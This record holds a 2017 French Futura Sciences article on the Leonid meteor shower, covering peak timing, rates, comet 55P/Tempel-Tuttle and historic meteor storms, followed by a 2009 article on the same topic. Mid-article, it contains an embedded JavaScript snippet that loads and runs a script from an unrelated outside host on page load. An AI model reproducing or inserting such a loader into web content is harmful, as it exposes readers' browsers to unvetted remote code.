{"title": "Etoiles filantes : ne manquez pas les Leonides !", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-11-17", "content": "Les 17 et 18 novembre, l'activite des Leonides, l'une des pluies d'etoiles filantes les plus importantes de l'annee, atteindra son maximum. Et cette annee, il n'y aura pas de Lune pour gener l'observation... La pluie d' etoiles filantes  des  Leonides  n'est pas aussi celebre que l'averse estivale des  Perseides , dont l'activite culmine entre le 12 et le 13 aout, mais elle gagne a etre connue. Certes, son activite, qui s'etend chaque annee entre le 6 et le 30 novembre, ne tombe pas pendant des vacances et se produit durant des nuits qui peuvent etre glaciales. Mais cela peut valoir la peine de passer un moment les  yeux  leves vers le ciel etoile de l' automne , a l'affut des  meteorites  et meme des  bolides , en compagnie d' Orion , du Taureau, du Grand  Chien ... C'est entre minuit et l' aube , les 17 et 18 novembre, que l' essaim meteoritique  des Leonides atteint son maximum d'activite. Le cru 2017 s'annonce classique avec une moyenne de 15 meteores visibles par heure. Mais attention, des  sursauts  ponctuels avec plus de 100 etoiles filantes par heure ne sont pas a exclure. La  vitesse  moyenne de penetration dans l' atmosphere  de ces meteores brillants est de 71 km/s. Par bonheur, cette annee, la  Lune  n'inondera pas le ciel de sa  lumiere . Mieux : discrete et en tres fin croissant le 17, elle cloturera la nuit en brillant a cote de  Venus  et  Jupiter . Le saviez-vous ? Les Leonides doivent leur nom a la constellation du Lion ou se situe le radiant de l'essaim meteoritique. En 1833 et 1866, la tempete d'etoiles filantes des Leonides avait stupefait les nord-americains qui ont pu l'admirer. (c) Domaine Public                       Des pluies d'etoiles filantes qui peuvent devenir des tempetes ! Les courants de poussiere qui sont a l'origine des Leonides sont alimentes par la  comete  55P/Tempel-Tuttle dont la  periode orbitale  est de 33 ans -- prochain  perihelie  en 2031. Apres ses passages, les pluies d'etoiles filantes peuvent alors se transformer en veritables tempetes !  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La  Terre  est alors arrosee de plusieurs milliers de minuscules grains cometaires, comme ce fut le cas en 1833, 1866, 1966 et plus recemment en 1999 et 2001. Des spectacles celestes saisissants qui ont a chaque fois marque les memoires. Selon les previsions, la Terre helas ne devrait pas revivre de tempetes  meteorites  aussi intenses avant 2099 ! Rappelons enfin que pour augmenter vos chances de voir un maximum d'etoiles filantes, il convient de vous eloigner le plus possible des grandes agglomerations urbaines, dont la  pollution lumineuse  nuit a l'observation. Prochain pic d'etoiles filantes important : les 13 et 14 decembre avec les  Geminides . Pour en savoir plus La pluie d'etoiles filantes des Leonides en 2009 Article de Jean-Baptiste Feldmann publie le 15 novembre 2009 Chaque annee, la Terre dans son deplacement coupe l' orbite  d'anciennes cometes qui ont abandonne des poussieres dans leur sillage. L'occasion d'observer quelques etoiles filantes qui se consument dans notre atmosphere, et plus rarement de veritables pluies de meteores. Qu'en sera-t-il le 17 novembre pour les Leonides ? Semblant emaner de la  constellation du Lion  par un effet de perspective, les Leonides sont les restes de la comete 55P/Tempel-Tuttle, decouverte fin 1865. Sa trajectoire l'amene tous les 33 ans a s'approcher du  Soleil  et a reinjecter des tonnes de poussieres sur son orbite, ce qui nous vaut un magnifique spectacle : en 1933, on a pu observer une moyenne de 200 meteores a l'heure et en 1966 c'est une veritable pluie de lumiere qui a emerveille les observateurs americains avec parfois plusieurs meteores par seconde. En 1998, les observateurs europeens ont eu une belle surprise : alors qu'il etait prevu d'admirer le maximum d'activite depuis l'Asie, ce dernier s'est decale pour se derouler en fin de nuit au-dessus de l'Europe, avec une moyenne de 500 Leonides par heure. En dehors de ces rendez-vous spectaculaires tous les 33 ans, l'essaim des Leonides reste l'un des plus riches, il est donc tres attendu chaque annee apres la mi-novembre. Pour autant la prevision de l'activite d'un essaim reste un art difficile : le flot de poussieres abandonne le long de l'orbite cometaire evolue lentement, soumis aux influences gravitationnelles du Soleil et des planetes, surtout les plus massives comme Jupiter. Les poussieres tendent a se regrouper en zones plus riches, des << poches >> que notre planete croise a des instants precis. Modelisation de la repartition des Leonides en 2009 le long de l'orbite terrestre, d'apres les calculs de l'IMCCE.                               Pour 2009, les dernieres simulations de l'IMCCE (Institut de Mecanique Celeste et de Calculs d'Ephemerides) font etat d'une belle activite la nuit du 17 au 18 novembre. Le maximum devrait se produire entre 21 heures et 23 heures TU (soit une heure plus tard en heure francaise) avec 100 a 300 meteores par heure. Malheureusement; le  radiant  (point d'ou semblent emaner les meteores) ne sera pas encore leve en Europe. La constellation du Lion deviendra visible apres minuit, alors que le pic d'activite sera passe. A moins que, comme en 1998, une bonne surprise ne vienne recompenser ceux qui auront eu le courage de veiller... Retrouvez toute l'actualite astronomique sur le  Blog Astro 2009 . Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  etoiles filantes perseides  |  etoiles filantes aout 2009  |  nuit des etoiles filantes 2008  |  nuit des etoiles filantes 2010  |  pluie etoile filante aout  |  enorme etoile filante  |  couleur etoile filante  |  etoile filante novembre  |  etoile filante verte  |  8p tuttle", "theme": "sciences"}